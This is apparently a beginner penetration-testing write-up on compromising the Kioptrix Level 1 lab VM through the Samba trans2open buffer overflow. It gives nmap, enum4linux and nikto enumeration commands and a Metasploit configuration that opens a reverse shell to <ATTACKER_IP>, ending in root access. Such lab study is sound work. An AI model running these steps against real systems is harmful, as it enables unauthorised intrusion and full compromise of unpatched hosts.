# Kioptrix Level 1 – Exploiting Samba trans2open

## Target Information

- **Target Machine:** Kioptrix Level 1
- **Target IP:** 192.168.56.102
- **Environment:** Local Lab
- **Difficulty:** Beginner

Kioptrix Level 1 is a vulnerable Linux virtual machine designed for penetration testing practice. The goal is to identify vulnerabilities within the system and gain root access.

---

# Phase 1: Reconnaissance & Enumeration

## Discovering the Target

The first step was to identify the target machine on the local network using **netdiscover**.

```bash
sudo netdiscover -r 192.168.56.1/24
```
Result:
```
192.168.56.102
```
## Network Scanning

Next, a detailed Nmap scan was performed to identify open ports, running services, and service versions.
```
nmap -sV -sC -A 192.168.56.102
```
The scan identified several open ports on the target system. Port 22 is running SSH, Port 80 is running HTTP, Port 111 is associated with RPC, Port 139 is used for SMB, Port 443 is running HTTPS, and Port 32768 is also related to RPC services. The scan additionally provided service banners, which are useful for identifying the versions of the running services and determining whether any of them are outdated or potentially vulnerable.

# Phase 2: Service Enumeration

Once open services were identified, further enumeration was performed on key services.

## Samba Enumeration (Port 139)

Using enumeration tools such as Metasploit and enum4linux, the Samba version running on the target was identified.

```
enum4linux -a 192.168.56.102
```
Result
```
Samba Version: 2.2.1a
```

This version is highly outdated and vulnerable to a well-known buffer overflow vulnerability called trans2open.

## Web Server Enumeration (Ports 80 / 443)

To further investigate the web server, a vulnerability scan was performed using Nikto.
```
nikto -h http://192.168.56.102
```

Findings

The server was running:
```
Apache + mod_ssl 2.8.4
```

This version is vulnerable to the OpenFuck exploit, which is another potential attack vector.

However, the Samba exploit provides a faster and more reliable path to root access, so it was chosen as the primary attack vector.

# Phase 3: Exploitation – Samba trans2open
## Vulnerability Overview

The trans2open vulnerability is a buffer overflow flaw present in older Samba versions (2.2.x). This vulnerability allows an attacker to execute arbitrary code remotely.

Since the service runs with elevated privileges, successful exploitation results in root-level access.

## Searching for Exploits

Using Metasploit, available exploit modules were searched.
```
msfconsole
search trans2open
```
Results
```
exploit/linux/samba/trans2open
exploit/multi/remote/10.c
```

The exploit/linux/samba/trans2open module was selected.

## Configuring the Exploit

Load the exploit module:
```
use exploit/linux/samba/trans2open
```

Configure the required options:
```
set RHOST 192.168.56.102
set RPORT 139
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
Launching the Exploit
```

Execute the attack:
```
run
```
## Exploitation Result

The exploit successfully triggered the vulnerability and returned a reverse shell.

Verification:
```
whoami
```
Output:
```
root
```
The system was fully compromised with root-level privileges.

# Attack Summary
The attack began with the reconnaissance phase, where network discovery was performed using netdiscover to identify active hosts on the network. During the enumeration phase, nmap was used to perform port scanning in order to discover open ports and running services on the target machine.

Next, service analysis was conducted using enum4linux to detect the version of the Samba service and gather additional information from the SMB service. This was followed by vulnerability scanning, where nikto was used to test the web server for known vulnerabilities and misconfigurations.

In the exploitation phase, the trans2open exploit was executed using Metasploit to take advantage of the vulnerable Samba service. As a result of the successful exploitation, the attacker obtained root access on the target system through a reverse TCP shell.

# Lessons Learned
1. Outdated Services Are Critical Risks

Running legacy services such as Samba 2.2.1a exposes systems to publicly known exploits that can lead directly to full system compromise.

2. Service Version Detection Is Essential

Tools like Nmap and enum4linux help identify vulnerable service versions, enabling targeted exploitation.

3. Multiple Attack Paths May Exist

Although the Apache mod_ssl OpenFuck exploit was present, the Samba trans2open exploit provided a simpler and faster path to root.

4. Automated Exploitation Frameworks Accelerate Attacks

Frameworks like Metasploit significantly reduce the complexity of exploiting vulnerabilities.

5. Defense-in-Depth Is Important

Even if one service is vulnerable, proper network segmentation and monitoring could limit the impact of exploitation.

Conclusion

Kioptrix Level 1 demonstrates the dangers of running outdated and unpatched services in production environments. Through reconnaissance, service enumeration, and exploitation of the Samba trans2open vulnerability, full root access to the system was obtained.

This lab highlights the importance of:

Regular patching

Service hardening

Network monitoring

Removing legacy services

to prevent similar compromises in real-world environments.
